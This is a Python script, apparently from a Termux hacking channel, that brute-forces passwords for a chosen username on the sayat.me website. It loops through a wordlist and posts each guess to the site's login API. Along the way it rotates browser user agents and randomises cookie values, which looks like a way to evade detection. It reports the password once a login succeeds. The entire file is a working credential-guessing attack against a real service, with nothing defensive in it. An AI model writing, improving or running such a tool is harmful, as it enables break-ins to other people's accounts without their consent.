import requests, random, json, time, colorama, os
os.system(['clear','cls'][os.name == 'nt'])
print("""
 _____                   _
/  ___|                 | |
\ `--.  __ _ _   _  __ _| |_
 `--. \/ _` | | | |/ _` | __|
/\__/ / (_| | |_| | (_| | |_
\____/ \__,_|\__, |\__,_|\__|
              __/ |
             |___/
                ______            _
                | ___ \          | |
                | |_/ /_ __ _   _| |_ ___
                | ___ \ '__| | | | __/ _ \.
                | |_/ / |  | |_| | ||  __/
                \____/|_|   \__,_|\__\___|
_______________________________
| Termux-Lab | t.me/termuxlab |
""")
def push(login, fils):
    print("Starting attack for '"+login+"'\n")
    with open(fils, 'r') as f:
        passwd = f.read().splitlines()
    for i in range(len(passwd)):
        cookrand = random.randint(0, 999999999999)
        sayrand = random.randint(0, 99)
        saykeyrand = random.randint(0, 99)
        uagent = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Safari/605.1.15",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
        ]
        url = "https://sayat.me/api/auth"
        data = {"username":login,"password":passwd[i]}
        headers={
        "Host": "sayat.me",
        "User-Agent":uagent[random.randint(0, len(uagent)-1)],
        "Accept": "application/vnd.react+json",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br",
        "Referer": "https://sayat.me/",
        "Content-Type": "application/json",
        "Origin": "https://sayat.me",
        "Content-Length": "45",
        "Connection": "keep-alive",
        "Cookie": "__cfduid=d1f9bd3e98f5b92535f8340248ef92c"+str(cookrand)+"; say-at-key=348be6d5-2151-4c"+str(saykeyrand)+"-95d5-7281e685bc"+str(sayrand)+"; _ga=GA1.2.257829564.1592837840; _gid=GA1.2.141668434.1592837840",
        "TE": "Trailers",
        "Pragma": "no-cache",
        "Cache-Control": "no-cache"
        }
        r = requests.post(url, json=data, headers=headers)
        if r.text == "":
            print("\033[42m\033[31mLogin: "+str(login)+" | Password: "+str(passwd[i])+"\033[0m")
            break
        else:
            print("\033[32m|"+str(i+1)+"|Login: "+str(login)+" |\033[31m Password: "+str(passwd[i])+"")
        time.sleep(0.5)
login = input("\033[32mEnter username:\033[35m sayat.me/")
fils = input("\033[0m\033[32m\nDefault 'list.txt'\n    Enter file name:\033[32m\033[35m ")
print("\033[32m")
if fils == "":
    fils = "list.txt"
push(login, fils)
